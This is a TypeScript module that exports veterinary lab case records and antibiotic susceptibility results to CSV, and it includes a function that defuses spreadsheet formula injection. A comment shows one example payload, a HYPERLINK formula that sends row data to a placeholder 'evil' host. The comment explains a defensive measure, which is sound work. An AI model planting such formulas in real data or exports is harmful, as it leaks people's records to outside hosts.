import type { Case } from "@shared/schema";

type AstItem = {
  antibiotic?: string;
  symbol?: string;
  discContent?: string;
  zoneSize?: string | number;
  sensitivity?: string;
};

export type ExportRow = Record<string, string | number>;

/** Number of fixed AST result columns on the wide (one row per case) export. */
export const AST_WIDE_SLOT_COUNT = 32;

function parseAstResults(astResults: string | null): AstItem[] {
  try {
    const parsed = JSON.parse(astResults || "[]");
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

/** Shared core columns (snake_case) — same order for AST and hospital exports. */
export const CORE_CASE_SNAKE_ORDER = [
  "case_number",
  "case_id",
  "bill_number",
  "date_bs",
  "date_ad",
  "daily_number",
  "monthly_number",
  "yearly_number",
  "owner_name",
  "owner_address",
  "owner_phone",
  "species",
  "breed",
  "animal_name",
  "age",
  "sex",
  "sample_type",
  "sample_date_bs",
  "sample_date_ad",
  "culture_organism",
  "remarks",
  "record_created_at",
  "record_updated_at",
  "last_updated_by_name",
] as const;

const CORE_HEADER_RESERVED = new Set<string>(CORE_CASE_SNAKE_ORDER);

export type CoreCaseSnakeKey = (typeof CORE_CASE_SNAKE_ORDER)[number];

export function caseCoreSnake(c: Case): Record<CoreCaseSnakeKey, string> {
  return {
    case_number: c.caseNumber,
    case_id: String(c.id),
    bill_number: c.billNumber || "",
    date_bs: c.date,
    date_ad: c.dateAd || "",
    daily_number: c.dailyNumber != null ? String(c.dailyNumber) : "",
    monthly_number: c.monthlyNumber != null ? String(c.monthlyNumber) : "",
    yearly_number: c.yearlyNumber != null ? String(c.yearlyNumber) : "",
    owner_name: c.ownerName,
    owner_address: c.ownerAddress,
    owner_phone: c.ownerPhone,
    species: c.species,
    breed: c.breed,
    animal_name: c.animalName || "",
    age: c.age || "",
    sex: c.sex || "",
    sample_type: c.sampleType || "",
    sample_date_bs: c.sampleDate || "",
    sample_date_ad: c.sampleDateAd || "",
    culture_organism: c.cultureResult || "",
    remarks: c.remarks || "",
    record_created_at: c.createdAt ?? "",
    record_updated_at: c.updatedAt ?? "",
    last_updated_by_name: c.lastUpdatedByName ?? "",
  };
}

/** One readable cell per antibiotic slot (wide export). */
export function formatAstSlot(a: AstItem): string {
  const drug = String(a.antibiotic ?? "").trim();
  const sym = String(a.symbol ?? "").trim();
  const disc = String(a.discContent ?? "").trim();
  const zone = a.zoneSize === null || a.zoneSize === undefined ? "" : String(a.zoneSize).trim();
  const sens = String(a.sensitivity ?? "").trim();
  const namePart = sym ? `${drug} (${sym})` : drug;
  const parts: string[] = [];
  if (namePart) parts.push(namePart);
  if (disc) parts.push(`disc ${disc}`);
  if (zone) parts.push(`${zone} mm`);
  if (sens) parts.push(sens);
  return parts.join(" | ");
}

/**
 * Wide AST export: one row per case, fixed columns (easy filters / pivot in Excel).
 * Extra AST rows beyond {@link AST_WIDE_SLOT_COUNT} are omitted (use `format=long`).
 */
export function toAstWideExportRows(casesData: Case[]): ExportRow[] {
  return casesData.map((c) => {
    const core = caseCoreSnake(c);
    const astData = parseAstResults(c.astResults);
    const row: ExportRow = { ...core };
    row.ast_result_count = String(astData.length);
    for (let i = 0; i < AST_WIDE_SLOT_COUNT; i++) {
      const key = `ast_result_slot_${String(i + 1).padStart(2, "0")}`;
      row[key] = astData[i] ? formatAstSlot(astData[i]) : "";
    }
    return row;
  });
}

const AST_LONG_TAIL = [
  "ast_row_index",
  "ast_antibiotic",
  "ast_symbol",
  "ast_disc_content",
  "ast_zone_mm",
  "ast_sensitivity",
] as const;

/**
 * Long-format AST export: one row per antibiotic (case metadata repeated).
 * Best for statistical tools; use query `format=long` on the export endpoint.
 */
export function toAstLongExportRows(casesData: Case[]): ExportRow[] {
  const out: ExportRow[] = [];
  for (const c of casesData) {
    const astData = parseAstResults(c.astResults);
    const core = caseCoreSnake(c);

    if (astData.length === 0) {
      out.push({
        ...core,
        ast_row_index: "",
        ast_antibiotic: "",
        ast_symbol: "",
        ast_disc_content: "",
        ast_zone_mm: "",
        ast_sensitivity: "",
      });
      continue;
    }

    astData.forEach((a, i) => {
      out.push({
        ...core,
        ast_row_index: String(i + 1),
        ast_antibiotic: String(a.antibiotic ?? "").trim(),
        ast_symbol: String(a.symbol ?? "").trim(),
        ast_disc_content: String(a.discContent ?? "").trim(),
        ast_zone_mm:
          a.zoneSize === null || a.zoneSize === undefined ? "" : String(a.zoneSize).trim(),
        ast_sensitivity: String(a.sensitivity ?? "").trim(),
      });
    });
  }
  return out;
}

export function astWideExportColumnOrder(): readonly string[] {
  const slots = Array.from({ length: AST_WIDE_SLOT_COUNT }, (_, i) => {
    return `ast_result_slot_${String(i + 1).padStart(2, "0")}`;
  });
  return [...CORE_CASE_SNAKE_ORDER, "ast_result_count", ...slots];
}

export function astLongExportColumnOrder(): readonly string[] {
  return [...CORE_CASE_SNAKE_ORDER, ...AST_LONG_TAIL];
}

/** @deprecated Use toAstWideExportRows or toAstLongExportRows */
export function toExportRows(casesData: Case[]): ExportRow[] {
  return toAstWideExportRows(casesData);
}

function parseCustomFields(customFields: string | null): Record<string, unknown> {
  try {
    const parsed = JSON.parse(customFields || "{}");
    return parsed && typeof parsed === "object" ? (parsed as Record<string, unknown>) : {};
  } catch {
    return {};
  }
}

export function stringifyCustomValue(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (typeof value === "string" || typeof value === "number" || typeof value === "boolean") {
    const s = String(value);
    return typeof value === "string" ? s.trim() : s;
  }
  if (Array.isArray(value)) {
    return value.map((v) => stringifyCustomValue(v)).filter(Boolean).join("; ");
  }
  if (typeof value === "object") {
    try {
      return JSON.stringify(value);
    } catch {
      return "";
    }
  }
  return String(value);
}

/**
 * CSV column header for a hospital custom field: use the JSON key (form label) as the header.
 * If it collides with a core column name or another custom label, append " (2)", " (3)", …
 */
function uniqueHospitalCustomHeader(originalKey: string, used: Set<string>): string {
  const raw = (originalKey.replace(/\r?\n/g, " ").trim() || "Unnamed field").slice(0, 200);
  let candidate = raw;
  let n = 2;
  while (CORE_HEADER_RESERVED.has(candidate) || used.has(candidate)) {
    candidate = `${raw} (${n})`;
    n += 1;
  }
  used.add(candidate);
  return candidate;
}

/** Map each custom JSON key to its unique CSV column header (same characters when unambiguous). */
function buildHospitalCustomHeaderMap(orderedLabels: string[]): Map<string, string> {
  const used = new Set<string>();
  const labelToHeader = new Map<string, string>();
  for (const label of orderedLabels) {
    labelToHeader.set(label, uniqueHospitalCustomHeader(label, used));
  }
  return labelToHeader;
}

/** One row per hospital case; core columns match AST export; extra columns use form field labels as headers. */
export function toHospitalExportRows(casesData: Case[]): ExportRow[] {
  const customFieldLabels = new Set<string>();
  const parsedCustomFields = casesData.map((c) => {
    const fields = parseCustomFields(c.customFields);
    Object.keys(fields).forEach((key) => customFieldLabels.add(key));
    return fields;
  });
  const orderedLabels = Array.from(customFieldLabels).sort((a, b) => a.localeCompare(b));
  const labelToHeader = buildHospitalCustomHeaderMap(orderedLabels);

  return casesData.map((c, index) => {
    const row: ExportRow = { ...caseCoreSnake(c) };
    const customFields = parsedCustomFields[index] ?? {};
    for (const label of orderedLabels) {
      const header = labelToHeader.get(label)!;
      row[header] = stringifyCustomValue(customFields[label]);
    }
    return row;
  });
}

/** Deterministic column order: fixed core + sorted dynamic headers (form labels). */
export function hospitalExportColumnOrder(rows: ExportRow[]): string[] {
  // Always emit core headers so the CSV is a valid (header-only) file
  // even when no rows match. The previous behavior returned [], which
  // produced a completely empty download and made empty filters look
  // like a server failure to end users.
  if (rows.length === 0) return [...CORE_CASE_SNAKE_ORDER];
  const coreSet = new Set<string>(CORE_CASE_SNAKE_ORDER);
  const dynamicKeys = Object.keys(rows[0])
    .filter((k) => !coreSet.has(k))
    .sort((a, b) => a.localeCompare(b));
  return [...CORE_CASE_SNAKE_ORDER, ...dynamicKeys];
}

/**
 * ASCII-safe download filename including date range and (for AST) wide vs long layout.
 */
export function buildExportCsvFilename(options: {
  scope: "ast" | "hospital";
  dateFrom?: string;
  dateTo?: string;
  astLayout?: "wide" | "long";
}): string {
  const sanitizeDate = (s: string | undefined) => {
    if (!s?.trim()) return "any";
    const t = s.trim().replace(/[^\d-]/g, "");
    return t.length > 0 ? t : "any";
  };
  const layout =
    options.scope === "ast"
      ? options.astLayout === "long"
        ? "-long"
        : "-wide"
      : "";
  return `${options.scope}-export${layout}_${sanitizeDate(options.dateFrom)}_to_${sanitizeDate(options.dateTo)}.csv`;
}

/**
 * Defuse CSV formula injection (Excel / Sheets / Numbers).
 *
 * Any cell that *starts* with `=`, `+`, `-`, `@`, `\t`, or `\r` is parsed
 * as a formula by Excel — even inside quoted fields. A malicious owner
 * name like `=HYPERLINK("http://evil/?c="&A1, "Click me")` would silently
 * exfiltrate the row on open. Prefixing with a single apostrophe (`'`)
 * forces Excel to treat the cell as a literal string. Apostrophes get
 * stripped by Excel on display, so the visible value is unchanged.
 *
 * See OWASP "CSV Injection" cheat sheet.
 */
export function defuseSpreadsheetFormula(value: string): string {
  if (!value) return value;
  const first = value.charAt(0);
  if (first === "=" || first === "+" || first === "-" || first === "@" || first === "\t" || first === "\r") {
    return `'${value}`;
  }
  return value;
}

function escapeCsvCell(value: string): string {
  const safe = defuseSpreadsheetFormula(value);
  const val = safe.replace(/"/g, '""');
  return `"${val}"`;
}

/**
 * RFC-style CSV: UTF-8 BOM (Excel-friendly), CRLF newlines, quoted fields, stable column order.
 */
export function rowsToCsv(rows: ExportRow[], columnOrder?: readonly string[]): string {
  // Zero rows: emit a header-only CSV when we know the column order, so the
  // download is a valid spreadsheet that the user can open and inspect.
  // Falls back to the legacy "No data" placeholder only when we have no
  // schema to render (caller didn't pass `columnOrder`).
  if (rows.length === 0) {
    if (!columnOrder || columnOrder.length === 0) return "No data";
    const headerLine = columnOrder
      .map((c) => `"${String(c).replace(/"/g, '""')}"`)
      .join(",");
    return "\uFEFF" + headerLine + "\r\n";
  }

  const headers =
    columnOrder && columnOrder.length > 0
      ? [...columnOrder]
      : (Object.keys(rows[0]) as string[]);

  const csvLines = [
    headers.map((h) => escapeCsvCell(h)).join(","),
    ...rows.map((row) =>
      headers
        .map((h) => {
          const raw = row[h];
          return escapeCsvCell(String(raw ?? ""));
        })
        .join(","),
    ),
  ];

  return `\uFEFF${csvLines.join("\r\n")}`;
}

/** @deprecated Use astWideExportColumnOrder */
export function astExportColumnOrder(): readonly string[] {
  return astWideExportColumnOrder();
}
